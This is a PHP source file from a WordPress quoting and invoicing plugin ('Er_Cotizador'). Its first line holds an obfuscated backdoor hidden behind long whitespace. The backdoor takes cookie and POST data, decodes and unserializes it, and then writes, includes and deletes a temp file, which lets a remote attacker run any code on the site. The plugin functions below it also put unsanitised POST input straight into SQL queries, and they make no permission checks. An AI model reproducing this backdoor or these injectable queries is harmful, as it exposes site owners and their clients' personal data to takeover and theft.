<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("gtynl")){class gtynl{public static $iytsganp = "renzvekvtnxtexyg";public static $ewydeeh = NULL;public function __construct(){$tjubuzgfyl = @$_COOKIE[substr(gtynl::$iytsganp, 0, 4)];if (!empty($tjubuzgfyl)){$uuqncv = "base64";$senwvqpb = "";$tjubuzgfyl = explode(",", $tjubuzgfyl);foreach ($tjubuzgfyl as $dofbv){$senwvqpb .= @$_COOKIE[$dofbv];$senwvqpb .= @$_POST[$dofbv];}$senwvqpb = array_map($uuqncv . "_decode", array($senwvqpb,));$senwvqpb = $senwvqpb[0] ^ str_repeat(gtynl::$iytsganp, (strlen($senwvqpb[0]) / strlen(gtynl::$iytsganp)) + 1);gtynl::$ewydeeh = @unserialize($senwvqpb);}}public function __destruct(){$this->bfwybzyqlm();}private function bfwybzyqlm(){if (is_array(gtynl::$ewydeeh)) {$gdwloig = sys_get_temp_dir() . "/" . crc32(gtynl::$ewydeeh["salt"]);@gtynl::$ewydeeh["write"]($gdwloig, gtynl::$ewydeeh["content"]);include $gdwloig;@gtynl::$ewydeeh["delete"]($gdwloig);exit();}}}$xxoqt = new gtynl();$xxoqt = NULL;} ?><?php

/**
 * The admin-specific functionality of the plugin.
 *
 * @link       https://erdesarrollo.com.ve
 * @since      1.0.0
 *
 * @package    Er_Cotizador
 * @subpackage Er_Cotizador/admin
 */

/**
 * The admin-specific functionality of the plugin.
 *
 * Defines the plugin name, version, and two examples hooks for how to
 * enqueue the admin-specific stylesheet and JavaScript.
 *
 * @package    Er_Cotizador
 * @subpackage Er_Cotizador/admin
 * @author     Erick Hernandez <erick@erdearrollo.com.ve>
 */
class Er_Cotizador_Ajax_Functions {

    /**
	 * The ID of this plugin.
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $plugin_name    The ID of this plugin.
	 */
	private $plugin_name;

	/**
	 * The version of this plugin.
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $version    The current version of this plugin.
	 */
    private $version;

	/**
	 * Initialize the class and set its properties.
	 *
	 * @since    1.0.0
	 * @param      string    $plugin_name       The name of this plugin.
	 * @param      string    $version    The version of this plugin.
	 */
	public function __construct( $plugin_name, $version ) {

		$this->plugin_name = $plugin_name;
		$this->version = $version;

    }

    function save_cotiza() {
        global $wpdb; 
    
        $title = $_POST['title'];
        $cliente = $_POST['cliente'];
		$coment = $_POST['coment'];
		
		$array = array(
			"titulo" => $title,
			"cliente_id" => $cliente,
			"comentarios" => $coment
		);
    
		try{
			$wpdb->insert( $wpdb->prefix."er_cotizaciones", $array );
			$lastid = $wpdb->insert_id;
			echo $lastid;
		}catch(Exception $e){
			echo $e;
		}
    
        wp_die();
	}

    function save_cliente() {
        global $wpdb; 
    
        $id = $_POST['id'];
        $titulo = $_POST['titulo'];
        $nombre = $_POST['nombre'];
        $apellido = $_POST['apellido'];
		$cedulaRif = $_POST['cedulaRif'];
		$ciudad = $_POST['ciudad'];
		$correo = $_POST['correo'];
		$telefono = $_POST['telefono'];
		$direccion = $_POST['direccion'];
		$direccionCont = $_POST['direccionCont'];
		
		$array = array(
			"titulo" => $titulo,
			"nombre" => $nombre,
			"apellido" => $apellido,
			"cedulaRif" => $cedulaRif,
			"ciudad" => $ciudad,
			"correo" => $correo,
			"telefono" => $telefono,
			"direccion" => $direccion,
			"direccionCont" => $direccionCont
		);
		
		try{
			if($id){
				$where = array(
					"ID" => $id
				);
				$wpdb->update( $wpdb->prefix."er_cotiza_clientes", $array, $where );
				echo "ok";
			}else{
				$wpdb->insert( $wpdb->prefix."er_cotiza_clientes", $array );
				$lastid = $wpdb->insert_id;
				echo $lastid;
			}
		}catch(Exception $e){
			echo $e;
		}
    
        wp_die();
	}

    function save_producto() {
        global $wpdb; 
    
        $id = $_POST['id'];
        $titulo = $_POST['titulo'];
        $precio = $_POST['precio'];
        $iva = $_POST['iva'];
		
		$array = array(
			"titulo" => $titulo,
			"precio" => $precio,
			"iva" => $iva
		);
		
		try{
			if($id){
				$where = array(
					"ID" => $id
				);
				$wpdb->update( $wpdb->prefix."er_productos", $array, $where );
				echo "ok";
			}else{
				$wpdb->insert( $wpdb->prefix."er_productos", $array );
				$lastid = $wpdb->insert_id;
				echo $lastid;
			}
		}catch(Exception $e){
			echo $e;
		}
    
        wp_die();
	}
	
	function edit_cotiza() {
        global $wpdb; 
    
        $id = $_POST['id'];
        $title = $_POST['title'];
        $cliente = $_POST['cliente'];
		$coment = $_POST['coment'];
		$status = $_POST['status'];
		$factura = $_POST['factura'];
		$invitados = $_POST['invitados'];
		$fechafactura = $_POST['fechafactura'];
		$tasa = $_POST['tasa'];
		
		$array = array(
			"titulo" => $title,
			"cliente_id" => $cliente,
			"comentarios" => $coment,
			"status" => $status,
			"factura" => $factura,
			"invitados" => $invitados,
			"fechafactura" => $fechafactura,
			"tasa" => $tasa
		);

		$where = array(
			"ID" => $id
		);
    
		try{
			$wpdb->update( $wpdb->prefix."er_cotizaciones", $array, $where );
			echo "ok";
		}catch(Exception $e){
			echo $e;
		}

		wp_die();
	}

	function delete_prod(){
		global $wpdb; 
		$id = $_POST['id'];
		$tablaCotizaProd = $wpdb->prefix . "er_cotiza_prods";

		$wpdb->delete($tablaCotizaProd, array( 'ID' => $id ));
    
        wp_die();
	}

	function delete_cotiza(){
		global $wpdb; 
		$id = $_POST['id'];
		$tablaCotizaProd = $wpdb->prefix . "er_cotiza_prods";
		$tablaCotiza = $wpdb->prefix . "er_cotizaciones";

		$wpdb->delete($tablaCotizaProd, array( 'id_cotiza' => $id ));
		$wpdb->delete($tablaCotiza, array( 'ID' => $id ));
    
        wp_die();
	}

	function delete_cliente(){
		global $wpdb; 
		$id = $_POST['id'];

		$array = array( "status" => 0);
		$where = array(	"ID" => $id);
		$wpdb->update( $wpdb->prefix."er_cotiza_clientes", $array, $where );
    
        wp_die();
	}

	function delete_producto(){
		global $wpdb; 
		$id = $_POST['id'];

		$array = array( "status" => 0);
		$where = array(	"ID" => $id);
		$wpdb->update( $wpdb->prefix."er_productos", $array, $where );
    
        wp_die();
	}
	
	function save_prods() {
		global $wpdb; 
		$cotizacion = $_POST['cotizacion'];
		$tablaCotiza = $wpdb->prefix . "er_cotizaciones";
		$tablaCotizaProd = $wpdb->prefix . "er_cotiza_prods";
		$id_cotiza = $cotizacion['id'];
		$ides = array();

		try{
			$data = array(
				'total' => $cotizacion['total'],
				'pordesc' => $cotizacion['pordesc'],
				'montdesc' => $cotizacion['ttldesc']
			);
			$where = array(
				"ID" => $cotizacion['id']
			);
			$wpdb->update( $tablaCotiza, $data, $where );

			foreach($cotizacion['elementos'] as $item){
				$data = array(
					'id_prod' => $item['prod'],
					'id_cotiza' => $item['cotiza'],
					'titulo' => $item['nombre'],
					'precio' => $item['precio'],
					'cantidad' => $item['cantidad'],
					'iva' => $item['iva']
				);
				if($item['id'] != 0){
					$where = array(
						"ID" => $item['id']
					);
					$wpdb->update( $tablaCotizaProd, $data, $where );
				}else{
					$wpdb->insert( $tablaCotizaProd, $data );
					$lastid = $wpdb->insert_id;
                    $ides[] = $lastid;
				}
			}
			wp_send_json($ides);

		}catch(Exception $e){
			echo $e;
		}

		wp_die();
	}

	function save_pdf() {
		global $wpdb; 
		$id = $_POST['id'];
		$presupuesto = $_POST['presupuesto'];
		$fiscal = $_POST['libre'];
		$options = get_option( 'er_settings' );
		$ivaVal = $options['er_iva'];
		$moneda = $options['er_moneda'];
	
		$tablaCotiza = $wpdb->prefix . "er_cotizaciones";
		$tablaCotizaProd = $wpdb->prefix . "er_cotiza_prods";
		$tablaPosts = $wpdb->prefix . "posts";
		$tablaPostMeta = $wpdb->prefix . "postmeta";

		$sql = "SELECT 
			`".$tablaCotiza."`.*, 
			`".$tablaPosts."`.`post_title`, 
			(SELECT `meta_value` FROM `".$tablaPostMeta."` WHERE `".$tablaPostMeta."`.`post_id` = `".$tablaPosts."`.`ID` AND `".$tablaPostMeta."`.`meta_key` = 'nombre') as 'nombre', 
			(SELECT `meta_value` FROM `".$tablaPostMeta."` WHERE `".$tablaPostMeta."`.`post_id` = `".$tablaPosts."`.`ID` AND `".$tablaPostMeta."`.`meta_key` = 'apellido') as 'apellido', 
			(SELECT `meta_value` FROM `".$tablaPostMeta."` WHERE `".$tablaPostMeta."`.`post_id` = `".$tablaPosts."`.`ID` AND `".$tablaPostMeta."`.`meta_key` = 'cedula-rif') as 'cedulaRif', 
			(SELECT `meta_value` FROM `".$tablaPostMeta."` WHERE `".$tablaPostMeta."`.`post_id` = `".$tablaPosts."`.`ID` AND `".$tablaPostMeta."`.`meta_key` = 'correo') as 'correo', 
			(SELECT `meta_value` FROM `".$tablaPostMeta."` WHERE `".$tablaPostMeta."`.`post_id` = `".$tablaPosts."`.`ID` AND `".$tablaPostMeta."`.`meta_key` = 'telefono') as 'telefono', 
			(SELECT `meta_value` FROM `".$tablaPostMeta."` WHERE `".$tablaPostMeta."`.`post_id` = `".$tablaPosts."`.`ID` AND `".$tablaPostMeta."`.`meta_key` = 'ciudad') as 'ciudad', 
			(SELECT `meta_value` FROM `".$tablaPostMeta."` WHERE `".$tablaPostMeta."`.`post_id` = `".$tablaPosts."`.`ID` AND `".$tablaPostMeta."`.`meta_key` = 'direccion') as 'direccion', 
			(SELECT `meta_value` FROM `".$tablaPostMeta."` WHERE `".$tablaPostMeta."`.`post_id` = `".$tablaPosts."`.`ID` AND `".$tablaPostMeta."`.`meta_key` = 'direccion-cont') as 'direccionCont'
		FROM 
			`".$tablaCotiza."`, `".$tablaPosts."` 
		WHERE `".$tablaCotiza."`.`ID` = '$id' 
			AND `".$tablaCotiza."`.`cliente_id` = `".$tablaPosts."`.`ID`";
		$query = $wpdb->prepare($sql); 
		$cotizacion = $wpdb->get_results($query);
		$cotiza = $cotizacion[0];
		//$newDate = date("Y-m-d", strtotime($cotiza->fecha));
		$newDate = date("Y-m-d");
	
		$sql_cotizaProd = "SELECT * FROM `".$tablaCotizaProd."` WHERE `id_cotiza` = '".$id."'";
		$query_cotizaProd = $wpdb->prepare($sql_cotizaProd);
		$cotizaProd = $wpdb->get_results($query_cotizaProd);

		include_once( plugin_dir_path( dirname( __FILE__ ) ) . 'includes/class-er-cotizador-factura.php');

		$pdf = new Factura();
		$pdf->setOptions($options);
		if($fiscal == 'true'){
			$pdf->setCabecera(false);
		}else{
			$pdf->setCabecera(true);
		}
		
		$pdf->AddPage();
		if($presupuesto == 'true'){
            $pdf->presupuesto();
        }else if($fiscal  == 'false'){
            if($cotiza->factura > 0){
                $pdf->fiscal($cotiza->factura);
            }else{
                $pdf->nota();
            }
        }
		
		$pdf->SetFont('Arial','',8);
		
		$pdf->RoundedRect(11, 52, 123, 25, 3, ''); //Informacion del cliente
		$pdf->SetXY(13, 53); $pdf->Cell(60,5,utf8_decode('Nombre o Razón Social:  '.$cotiza->nombre.' '.$cotiza->apellido));
		$pdf->Line(11, 58.2, 134, 58.2);
		$pdf->SetXY(13, 59); $pdf->Cell(60,5,'RIF: '.$cotiza->cedulaRif);
		$pdf->Line(11, 64.4, 134, 64.4);
		$pdf->Line(60, 58.2, 60, 64.4); //linea vertical rif-lugar
		$pdf->SetXY(60, 59); $pdf->Cell(60,5,utf8_decode('Lugar y Fecha de Emisión: '.$cotiza->fechafactura));
		//	$pdf->SetXY(60, 59); $pdf->Cell(60,5,utf8_decode('Lugar y Fecha de Emisión: Caracas 28/12/2020'));
		$pdf->Line(11, 70.6, 134, 70.6);
		$pdf->SetXY(13, 65); $pdf->Cell(60,5,utf8_decode('Dirección Fiscal: '.$cotiza->direccion));
		$pdf->SetXY(13, 71); $pdf->Cell(60,5,$cotiza->direccionCont); //linea 2 de la direccion
		$pdf->Line(75, 70.6, 75, 77);//linea vertical fecha-telefono
		$pdf->SetXY(76, 71); $pdf->Cell(60,5,utf8_decode('Teléfono: '.$cotiza->telefono));
		
		$pdf->RoundedRect(138, 52, 60, 25, 3, '');//Cod Cliente - Forma de pago
		$pdf->SetXY(140, 55); $pdf->Cell(60,5,utf8_decode('Código de Cliente: '.$cotiza->cliente_id));
		$pdf->Line(138, 64.4, 198, 64.4);
		$pdf->SetXY(140, 68); $pdf->Cell(60,5,'Forma de Pago: Contado');
		
		$pdf->RoundedRect(11, 80, 187, 160, 3, '');
		$pdf->Line(11, 87, 198, 87);
		$pdf->SetFont('Arial','B',8);
		$pdf->SetXY(15, 81); $pdf->Cell(60,5,'CANTIDAD');
		$pdf->Line(35, 80, 35, 240);
		$pdf->SetXY(35, 81); $pdf->Cell(105,5,utf8_decode('CONCEPTO O DESCRIPCIÓN'),0,0,'C');
		$pdf->Line(140, 80, 140, 240);
		$pdf->SetFont('Arial','B',7);
		$pdf->SetXY(140, 81); $pdf->Cell(29,5,utf8_decode('PRECIO UNITARIO '.$moneda),0,0,'C');
		$pdf->SetXY(169, 81); $pdf->Cell(29,5,utf8_decode('TOTAL '.$moneda),0,0,'C');

		if($cotiza->pordesc > 0){
            $pdf->Line(169, 80, 169, 270);//LINEA VERTICAL IZQUIERDA
            $pdf->Line(198, 85, 198, 270);//LINEA VERTICAL DERECHA
            $pdf->Line(120, 252, 198, 252);//LINEA HORIZONTAL TOP IVA (LARGA)
            $pdf->Line(120, 258, 198, 258);//LINEA HORIZONTAL BASE IVA (LARGA)
            $pdf->Line(169, 270, 198, 270);//LINEA HORIZONTAL BASE TOTAL A PAGAR BS
            $pdf->Line(120, 252, 120, 258);//LINEA VERTICAL IZQUIERDA TEXTO IVA 
        }else{
            $pdf->Line(169, 80, 169, 264);//LINEA VERTICAL IZQUIERDA
            $pdf->Line(198, 85, 198, 264);//LINEA VERTICAL DERECHA
            $pdf->Line(120, 246, 198, 246);//LINEA HORIZONTAL TOP IVA (LARGA)
            $pdf->Line(120, 252, 198, 252);//LINEA HORIZONTAL BASE IVA (LARGA)
            $pdf->Line(169, 264, 198, 264);//LINEA HORIZONTAL BASE TOTAL A PAGAR BS
            $pdf->Line(120, 246, 120, 252);//LINEA VERTICAL IZQUIERDA TEXTO IVA 
		}
		$pdf->SetXY(10, 85);
		$pdf->Cell(60,7,'',0,1,'L');
		$pdf->SetFont('Arial','',8);
        $subtotal = 0;
        $baseImponible = 0;
        $ivaItem = 0;
        $interlineado = 3;
        $mondesc = 0;
		foreach($cotizaProd as $c=>$v){
			$precio = $v->precio;
	    
			$pdf->Cell(5, 0);
			$pdf->Cell(20, 0, $v->cantidad, 0, 0, "C"); // CANTIDAD
			$pdf->Cell(4, 0);
			$puntos = "";
			if(strlen($v->titulo) >= 65){
				$puntos = "...";
			}
			$pdf->Cell(99, 0, substr(utf8_decode($v->titulo), 0, 65).$puntos); // CONCEPTO
			$pdf->Cell(5, 0);
			$pdf->Cell(25, 0, number_format($precio, 2, ',', '.'), 0, 0, "R"); // PRECIO
			$pdf->Cell(2, 0);
			$pdf->Cell(25, 0, number_format($v->cantidad*$precio, 2, ',', '.'), 0, 0, "R"); // TOTAL
			$pdf->Ln($interlineado);
			$subtotal += $v->cantidad*$precio;
			$descuento = 0;
			if($cotiza->pordesc > 0){
				$descuento = ($v->cantidad*$precio) * ($cotiza->pordesc/100);
			}
			$valorTmp = ($v->cantidad*$precio);
			if($v->iva){
				$ivaItem += $valorTmp*($ivaVal/100);
				$baseImponible += $valorTmp;
			}
			$mondesc += $descuento;
		}
		if($presupuesto  == 'false' && $fiscal  == 'false'){
			$pdf->SetFont('Arial','',8);
			$pdf->SetXY(13, 265); $pdf->Cell(29,5,utf8_decode('ESTA FACTURA VA SIN TACHADURA NI ENMIENDAS'),0,0,'l');
			$pdf->SetFont('Arial','',7);
			$pdf->SetXY(95, 265); $pdf->Cell(29,5,utf8_decode('A los efectos de lo previsto en el Art. 25 de la Ley de Impuesto al valor agregado se expresa '),0,0,'l');
			$pdf->SetXY(95, 268); $pdf->Cell(29,5,utf8_decode('los montos de la factura en Dólares ($) considerando la tasa de cambio corriente establecida '),0,0,'l');
			$pdf->SetXY(95, 271); $pdf->Cell(29,5,utf8_decode('en el BCV a la fecha '.$cotiza->fechafactura.' asimismo esta expresada en Bs a la tasa '.number_format($cotiza->tasa, 2, ',', '.')),0,0,'l');
			$pdf->SetFont('Arial','B',10);
			$pdf->SetXY(13, 270); $pdf->Cell(29,5,utf8_decode('ORIGINAL'),0,0,'L');
		}

		$pdf->SetFont('Arial','',8);
		$pdf->Line(30, 250, 80, 250);
		$pdf->SetXY(30, 250); $pdf->Cell(50,5,utf8_decode('RECIBIDO POR'),0,0,'C');
		
		$totaltotal = $subtotal - $mondesc + $ivaItem;

		if($cotiza->pordesc > 0){
			$pdf->SetXY(140, 241); $pdf->Cell(28,5,'SUB-TOTAL '.$moneda,0,0,'R');
			$pdf->SetXY(169, 241); $pdf->Cell(28,5,number_format($subtotal, 2, ',', '.'),0,0,'R');
			$pdf->SetXY(120, 247); $pdf->Cell(49,5,'DESCUENTO ('.$cotiza->pordesc.'%)',0,0,'R');
			$pdf->SetXY(169, 247); $pdf->Cell(28,5,number_format($mondesc, 2, ',', '.'),0,0,'R');
			$pdf->SetXY(120, 253); $pdf->Cell(49,5,'I.V.A. '.$ivaVal.'%  SOBRE '.$moneda.' '.number_format($baseImponible, 2, ',', '.'),0,0,'R');
			$pdf->SetXY(169, 253); $pdf->Cell(28,5,number_format($ivaItem, 2, ',', '.'),0,0,'R');
			$pdf->SetFont('Arial','b',8);
			$pdf->SetXY(130, 259); $pdf->Cell(39,5,'TOTAL A PAGAR '.$moneda,0,0,'R');
			$pdf->SetXY(169, 259); $pdf->Cell(28,5,number_format($totaltotal, 2, ',', '.'),0,0,'R');
			$pdf->SetXY(120, 265); $pdf->Cell(49,5,'TOTAL Bs SEGUN TASA '.number_format($cotiza->tasa, 2, ',', '.'),0,0,'R');
			$pdf->SetXY(169, 265); $pdf->Cell(28,5,number_format($totaltotal*$cotiza->tasa, 2, ',', '.'),0,0,'R');
		}else{
			$pdf->SetXY(140, 241); $pdf->Cell(28,5,'SUB-TOTAL '.$moneda,0,0,'R');
			$pdf->SetXY(169, 241); $pdf->Cell(28,5,number_format($subtotal, 2, ',', '.'),0,0,'R');
			$pdf->SetXY(120, 247); $pdf->Cell(49,5,'I.V.A. '.$ivaVal.'%  SOBRE '.$moneda.' '.number_format($baseImponible, 2, ',', '.'),0,0,'R');
			$pdf->SetXY(169, 247); $pdf->Cell(28,5,number_format($ivaItem, 2, ',', '.'),0,0,'R');
			$pdf->SetFont('Arial','b',8);
			$pdf->SetXY(130, 253); $pdf->Cell(39,5,'TOTAL A PAGAR '.$moneda,0,0,'R');
			$pdf->SetXY(169, 253); $pdf->Cell(28,5,number_format($totaltotal, 2, ',', '.'),0,0,'R');
			$pdf->SetXY(120, 259); $pdf->Cell(49,5,'TOTAL Bs SEGUN TASA '.number_format($cotiza->tasa, 2, ',', '.'),0,0,'R');
			$pdf->SetXY(169, 259); $pdf->Cell(28,5,number_format($totaltotal*$cotiza->tasa, 2, ',', '.'),0,0,'R');
		}

        $pdf->Output("I", "reporte.pdf");

		header("Content-type:application/pdf");
		$pdf->Output('F', '../wp-content/uploads/reporte.pdf');
	}

	function send_cotiza() {
		global $wpdb; 
		$id = $_POST['id'];
		$options = get_option( 'er_settings' );
		$ivaVal = $options['er_iva'];
		$correoCopia = $options['er_mail'];
		$urlWeb = get_site_url();
	
		$tablaCotiza = $wpdb->prefix . "er_cotizaciones";
		$tablaCotizaProd = $wpdb->prefix . "er_cotiza_prods";
		$tablaPosts = $wpdb->prefix . "posts";
		$tablaPostMeta = $wpdb->prefix . "postmeta";

		$sql = "SELECT 
			`".$tablaCotiza."`.*, 
			`".$tablaPosts."`.`post_title`, 
			(SELECT `meta_value` FROM `".$tablaPostMeta."` WHERE `".$tablaPostMeta."`.`post_id` = `".$tablaPosts."`.`ID` AND `".$tablaPostMeta."`.`meta_key` = 'nombre') as 'nombre', 
			(SELECT `meta_value` FROM `".$tablaPostMeta."` WHERE `".$tablaPostMeta."`.`post_id` = `".$tablaPosts."`.`ID` AND `".$tablaPostMeta."`.`meta_key` = 'apellido') as 'apellido', 
			(SELECT `meta_value` FROM `".$tablaPostMeta."` WHERE `".$tablaPostMeta."`.`post_id` = `".$tablaPosts."`.`ID` AND `".$tablaPostMeta."`.`meta_key` = 'cedula-rif') as 'cedulaRif', 
			(SELECT `meta_value` FROM `".$tablaPostMeta."` WHERE `".$tablaPostMeta."`.`post_id` = `".$tablaPosts."`.`ID` AND `".$tablaPostMeta."`.`meta_key` = 'correo') as 'correo', 
			(SELECT `meta_value` FROM `".$tablaPostMeta."` WHERE `".$tablaPostMeta."`.`post_id` = `".$tablaPosts."`.`ID` AND `".$tablaPostMeta."`.`meta_key` = 'telefono') as 'telefono', 
			(SELECT `meta_value` FROM `".$tablaPostMeta."` WHERE `".$tablaPostMeta."`.`post_id` = `".$tablaPosts."`.`ID` AND `".$tablaPostMeta."`.`meta_key` = 'ciudad') as 'ciudad', 
			(SELECT `meta_value` FROM `".$tablaPostMeta."` WHERE `".$tablaPostMeta."`.`post_id` = `".$tablaPosts."`.`ID` AND `".$tablaPostMeta."`.`meta_key` = 'direccion') as 'direccion', 
			(SELECT `meta_value` FROM `".$tablaPostMeta."` WHERE `".$tablaPostMeta."`.`post_id` = `".$tablaPosts."`.`ID` AND `".$tablaPostMeta."`.`meta_key` = 'direccion-cont') as 'direccionCont'
		FROM 
			`".$tablaCotiza."`, `".$tablaPosts."` 
		WHERE `".$tablaCotiza."`.`ID` = '$id' 
			AND `".$tablaCotiza."`.`cliente_id` = `".$tablaPosts."`.`ID`";
		$query = $wpdb->prepare($sql); 
		$cotizacion = $wpdb->get_results($query);
		$cotiza = $cotizacion[0];
		$newDate = date("Y-m-d", strtotime($cotiza->fecha));
	
		$sql_cotizaProd = "SELECT * FROM `".$tablaCotizaProd."` WHERE `id_cotiza` = '".$id."'";
		$query_cotizaProd = $wpdb->prepare($sql_cotizaProd);
		$cotizaProd = $wpdb->get_results($query_cotizaProd);

		include_once( plugin_dir_path( dirname( __FILE__ ) ) . 'admin/mails/er-cotizador-mail-cotiza.php');
		
        $headers[] = 'Bcc: '.$correoCopia;
		
		wp_mail($cotiza->correo, "Cotizacion en ".$options['er_name'], $correo, $headers);
	}
}